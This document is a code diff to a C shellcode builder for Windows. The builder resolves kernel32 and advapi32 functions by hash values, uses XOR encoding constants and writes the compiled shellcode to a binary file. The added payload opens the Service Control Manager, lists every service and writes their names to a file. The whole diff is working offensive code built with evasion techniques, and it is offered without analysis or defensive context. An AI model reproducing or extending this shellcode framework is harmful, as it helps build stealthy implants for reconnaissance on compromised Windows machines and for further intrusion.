@@ -10,19 +10,21 @@
 #define XOR_VAL 0x01010101
 #define XOR_BYTE 0x11
 
-#define ACTIVE_CODE_SZ 1045
+#define ACTIVE_CODE_SZ 1637
 #define XOR_CODE_SZ 75
 
 #define Kernel32Dll_HASH 1848363543
 
 // from kernel32
-#define ExitProcess_HASH 1944246398
-#define LoadLibrary_HASH 3960360590
-#define FreeLibrary_HASH 1305073056
-#define CreateFile_HASH  2080380837
-#define WriteFile_HASH	 3893000479
-#define CloseHandle_HASH 268277755
+#define ExitProcess_HASH  1944246398
+#define LoadLibrary_HASH  3960360590
+#define FreeLibrary_HASH  1305073056
+#define CreateFile_HASH   2080380837
+#define WriteFile_HASH	  3893000479
+#define CloseHandle_HASH  268277755
 #define GetLastError_HASH 1977227622
+#define LocalAlloc_HASH   1275238394
+#define LocalFree_HASH    1555753718
 
 // from advapi32
 #define OpenSCManagerA_HASH		 3194409588
@@ -154,13 +156,128 @@ void __stdcall shell_entry()
 	if (NULL == (closeServiceHandle = find_function(hAdvapi, CloseServiceHandle_HASH)))
 		exit(11);
 
+	// left to import dynamic allocation functions
+	// and GetLastError
+
+	FARPROC getLastError;
+	if (NULL == (getLastError = find_function(hKernel, GetLastError_HASH)))
+		exit(12);
+
+	FARPROC localAlloc;
+	if (NULL == (localAlloc = find_function(hKernel, LocalAlloc_HASH)))
+		exit(13);
+
+	FARPROC localFree;
+	if (NULL == (localFree = find_function(hKernel, LocalFree_HASH)))
+		exit(14);
+
+	LPCSTR pszBuf;
+
+	if (NULL == (pszBuf = (LPCSTR)localAlloc(LMEM_FIXED, MAX_PATH * sizeof(CHAR))))
+		exit(255);
+	
+	localFree(pszBuf);
+
+	
 	////////////////////////////-------------- main body
 
 	// all functions are loaded
 	// then perform main task
 
+	SC_HANDLE h_SCM;
+	ENUM_SERVICE_STATUSA struct_ServiceStatus;
+	ENUM_SERVICE_STATUSA *lpServiceStatus = NULL;
+	BOOL b_RetVal = FALSE;
+	DWORD dw_BytesNeeded;
+	DWORD dw_ServiceCount;
+	DWORD dw_ResumeHandle = 0;
+	DWORD dw_ServiceType;
+	DWORD dw_ServiceState;
+
+	h_SCM = (SC_HANDLE)openSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
+
+	if (h_SCM == NULL)
+		goto cleanup;
+
+	//We are interested every service
+	dw_ServiceType = SERVICE_WIN32;
+
+	// interested to know about services in all states
+	dw_ServiceState = SERVICE_STATE_ALL;
+
+	//Call EnumServicesStatus using the handle returned by OpenSCManager
+	b_RetVal = enumServicesStatus(
+		h_SCM,
+		dw_ServiceType,
+		dw_ServiceState,
+		&struct_ServiceStatus,
+		sizeof(struct_ServiceStatus),
+		&dw_BytesNeeded,
+		&dw_ServiceCount,
+		&dw_ResumeHandle);
+
+	DWORD dw_Error = getLastError();
+
+	// Verify if EnumServicesStatus needs more memory space
+	if ((b_RetVal == FALSE) || dw_Error == ERROR_MORE_DATA)
+	{
+		DWORD dw_Bytes = dw_BytesNeeded + sizeof(ENUM_SERVICE_STATUSA);
+		
+		lpServiceStatus = (ENUM_SERVICE_STATUSA*)
+			localAlloc(LMEM_FIXED, sizeof(ENUM_SERVICE_STATUSA) * dw_Bytes);
+		
+		if (lpServiceStatus == NULL)
+			goto cleanup;
+
+		b_RetVal = enumServicesStatus(h_SCM,
+			dw_ServiceType,
+			dw_ServiceState,
+			lpServiceStatus,
+			dw_Bytes,
+			&dw_BytesNeeded,
+			&dw_ServiceCount,
+			&dw_ResumeHandle);
+
+		if (b_RetVal == FALSE)
+			goto cleanup;
+	}
+
+	
+	/////////////////////----------- write list of services to file
+
+	if (INVALID_HANDLE_VALUE == (hFile = (HANDLE)createFile(fileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL)))
+		goto cleanup;
+
+	char* p;
+	int n;
+	char nl[] = { '\r', '\n', 0 };
+
+	for (DWORD i = 0; i < dw_ServiceCount; i++)
+	{
+		// get length of string
+		p = lpServiceStatus[i].lpDisplayName;
+		while (*p)
+			p++;
+
+		n = p - lpServiceStatus[i].lpDisplayName;
+
+		//writeFile(hFile, str, sizeof(str), &written, NULL);
+		writeFile(hFile, lpServiceStatus[i].lpDisplayName, n, &written, NULL);
+		writeFile(hFile, nl, 2, &written, NULL);
+	}
+
+	closeHandle(hFile);
 
 
+cleanup:
+
+	//Close the SC_HANLDE returned by OpenSCManager
+	if (h_SCM)
+		closeServiceHandle(h_SCM);
+
+	// free buffer
+	if (lpServiceStatus)
+		localFree(lpServiceStatus);
 
 	// cleanup and exit
 	freeLibrary(hAdvapi);
@@ -267,21 +384,6 @@ FARPROC __stdcall find_function(HMODULE module, DWORD hash)
 }
 
 ////////////
-
-void __stdcall initError(FARPROC getLastError, int exit_code)
-{
-	int err = getLastError();
-
-	__asm
-	{
-		xor eax, eax
-		mov eax, err
-		xor eax, eax
-	}
-
-	exit(exit_code);
-}
-
 
 void __declspec(naked) END_SHELLCODE(void) {}
 
@@ -468,12 +570,9 @@ BOOL sc_write_bin(char *path)
 
 int main(int argc, char *argv[])
 {
-	//shell_code();
-
 	// clear config file
 	CopyFile("..\\Release\\"CONFIG_FILE_COPY, "..\\Release\\"CONFIG_FILE, FALSE);
 	CopyFile(CONFIG_FILE_COPY, CONFIG_FILE, FALSE);
-
 
 	// write shell code to bin file
 	if (!sc_write_bin(SHELLCODE_FILE) || !sc_write_bin("..\\Release\\"SHELLCODE_FILE))
